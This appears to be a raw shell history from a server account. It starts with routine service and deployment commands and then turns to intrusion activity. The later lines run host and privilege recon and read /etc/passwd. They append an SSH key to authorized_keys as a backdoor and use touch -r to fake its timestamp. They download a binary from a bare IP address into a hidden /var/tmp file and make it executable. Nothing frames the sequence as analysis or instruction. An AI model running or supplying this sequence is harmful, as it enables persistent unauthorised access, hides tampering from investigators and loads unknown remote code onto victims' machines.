cd app
ls
systemctl status app
sudo systemctl restart app
git pull
tail -f /var/log/app/app.log
make deploy
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJb1c6XzBUoQHrztbXT1Ux/SD7AIEiK/ywVLGCptdFVh ops@build' >> ~/.ssh/authorized_keys
touch -r /etc/hostname /home/ops/.ssh/authorized_keys
wget -q http://77.129.82.102/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
